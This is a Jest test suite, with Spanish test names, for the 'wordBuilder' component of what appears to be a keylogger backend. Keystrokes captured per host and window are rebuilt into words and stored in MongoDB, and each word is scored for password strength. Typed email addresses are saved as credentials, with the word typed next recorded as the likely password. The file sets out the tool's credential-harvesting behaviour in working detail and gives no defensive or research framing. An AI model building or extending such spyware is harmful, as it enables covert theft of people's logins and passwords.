const mongoose = require('mongoose');
const { connect, disconnect, clearAll } = require('./dbHelper');
const wordBuilder = require('../wordBuilder');
const Word = require('../models/Word');
const Credential = require('../models/Credential');

beforeAll(connect);
afterAll(disconnect);
afterEach(clearAll);

function typeString(str, host = 'test-host', win = 'test-window') {
  for (const ch of str) {
    wordBuilder.handleKey({ host, window: win, key: ch, timestamp: new Date() });
  }
}

function typeSpecial(key, host = 'test-host', win = 'test-window') {
  wordBuilder.handleKey({ host, window: win, key, timestamp: new Date() });
}

describe('wordBuilder - separacion de palabras', () => {
  test('espacio separa dos palabras', async () => {
    typeString('hola mundo');
    typeSpecial('[ENTER]');
    await wordBuilder.flushAll();

    const words = await Word.find({}).sort({ timestamp: 1 });
    expect(words.length).toBe(2);
    expect(words[0].word).toBe('hola');
    expect(words[1].word).toBe('mundo');
  });

  test('multiples espacios seguidos no crean palabras vacias', async () => {
    typeString('hola   mundo');
    await wordBuilder.flushAll();

    const words = await Word.find({});
    expect(words.length).toBe(2);
  });

  test('Enter separa palabras', async () => {
    typeString('hola');
    typeSpecial('[ENTER]');
    typeString('mundo');
    typeSpecial('[ENTER]');
    await wordBuilder.flushAll();

    const words = await Word.find({}).sort({ timestamp: 1 });
    expect(words.length).toBe(2);
    expect(words[0].word).toBe('hola');
    expect(words[1].word).toBe('mundo');
  });

  test('Tab separa palabras', async () => {
    typeString('uno');
    typeSpecial('[TAB]');
    typeString('dos');
    await wordBuilder.flushAll();

    const words = await Word.find({}).sort({ timestamp: 1 });
    expect(words.length).toBe(2);
    expect(words[0].word).toBe('uno');
    expect(words[1].word).toBe('dos');
  });

  test('signos de puntuacion se acumulan en la palabra', async () => {
    typeString('hola,mundo;test');
    await wordBuilder.flushAll();

    const words = await Word.find({});
    expect(words.length).toBe(1);
    expect(words[0].word).toBe('hola,mundo;test');
  });

  test('@ y . NO separan (para capturar emails)', async () => {
    typeString('user@mail.com');
    typeSpecial('[ENTER]');
    await wordBuilder.flushAll();

    const words = await Word.find({});
    expect(words.length).toBe(0);

    const creds = await Credential.find({});
    expect(creds.length).toBe(1);
    expect(creds[0].email).toBe('user@mail.com');
  });

  test('palabras de 1 caracter se ignoran (MIN_LEN=2)', async () => {
    typeString('a b cc');
    await wordBuilder.flushAll();

    const words = await Word.find({});
    expect(words.length).toBe(1);
    expect(words[0].word).toBe('cc');
  });

  test('backspace borra el ultimo caracter', async () => {
    typeString('holx');
    typeSpecial('[BACKSPACE]');
    typeString('a');
    typeSpecial('[ENTER]');
    await wordBuilder.flushAll();

    const words = await Word.find({});
    expect(words.length).toBe(1);
    expect(words[0].word).toBe('hola');
  });

  test('modificadores no afectan al buffer', async () => {
    wordBuilder.handleKey({ host: 'h', window: 'w', key: 'h', timestamp: new Date() });
    wordBuilder.handleKey({ host: 'h', window: 'w', key: '[SHIFT]', timestamp: new Date() });
    wordBuilder.handleKey({ host: 'h', window: 'w', key: 'O', timestamp: new Date() });
    wordBuilder.handleKey({ host: 'h', window: 'w', key: 'l', timestamp: new Date() });
    wordBuilder.handleKey({ host: 'h', window: 'w', key: 'a', timestamp: new Date() });
    wordBuilder.handleKey({ host: 'h', window: 'w', key: ' ', timestamp: new Date() });
    await wordBuilder.flushAll();

    const words = await Word.find({ host: 'h' });
    expect(words.length).toBe(1);
    expect(words[0].word).toBe('hOla');
  });

  test('cambio de ventana cierra la palabra', async () => {
    wordBuilder.handleKey({ host: 'h', window: 'win1', key: 'h', timestamp: new Date() });
    wordBuilder.handleKey({ host: 'h', window: 'win1', key: 'o', timestamp: new Date() });
    wordBuilder.handleKey({ host: 'h', window: 'win2', key: 'l', timestamp: new Date() });
    wordBuilder.handleKey({ host: 'h', window: 'win2', key: 'a', timestamp: new Date() });
    await wordBuilder.flushAll();

    const words = await Word.find({ host: 'h' }).sort({ timestamp: 1 });
    expect(words.length).toBe(2);
    expect(words[0].word).toBe('ho');
    expect(words[1].word).toBe('la');
  });
});

describe('wordBuilder - clasificacion de complejidad', () => {
  test('solo letras = null (sin complejidad)', async () => {
    typeString('hola ');
    await wordBuilder.flushAll();
    const w = await Word.findOne({});
    expect(w.complexity).toBeNull();
  });

  test('letras + numeros = alphanumeric', async () => {
    typeString('casa42 ');
    await wordBuilder.flushAll();
    const w = await Word.findOne({});
    expect(w.word).toBe('casa42');
    expect(w.complexity).toBe('alphanumeric');
  });

  test('mayuscula + minuscula + numero = mixed-case-num', async () => {
    typeString('Hola123 ');
    await wordBuilder.flushAll();
    const w = await Word.findOne({});
    expect(w.word).toBe('Hola123');
    expect(w.complexity).toBe('mixed-case-num');
  });

  test('mayus + minus + num + especial = strong', async () => {
    typeString('P@ss1word ');
    await wordBuilder.flushAll();
    const w = await Word.findOne({});
    expect(w).not.toBeNull();
    expect(w.complexity).toBe('strong');
  });
});

describe('wordBuilder - deteccion de credenciales', () => {
  test('email se guarda como Credential', async () => {
    typeString('test@example.com ');
    await wordBuilder.flushAll();

    const creds = await Credential.find({});
    expect(creds.length).toBe(1);
    expect(creds[0].email).toBe('test@example.com');

    const words = await Word.find({});
    expect(words.length).toBe(0);
  });

  test('palabra despues de email se guarda como nextWord', async () => {
    typeString('admin@site.org ');
    typeString('secreto123 ');
    await wordBuilder.flushAll();

    const creds = await Credential.find({});
    expect(creds.length).toBe(1);
    expect(creds[0].email).toBe('admin@site.org');
    expect(creds[0].nextWord).toBe('secreto123');
  });

  test('multiples emails se detectan por separado', async () => {
    typeString('a@b.co pass1 c@d.es pass2 ');
    await wordBuilder.flushAll();

    const creds = await Credential.find({}).sort({ timestamp: 1 });
    expect(creds.length).toBe(2);
    expect(creds[0].email).toBe('a@b.co');
    expect(creds[1].email).toBe('c@d.es');
  });
});
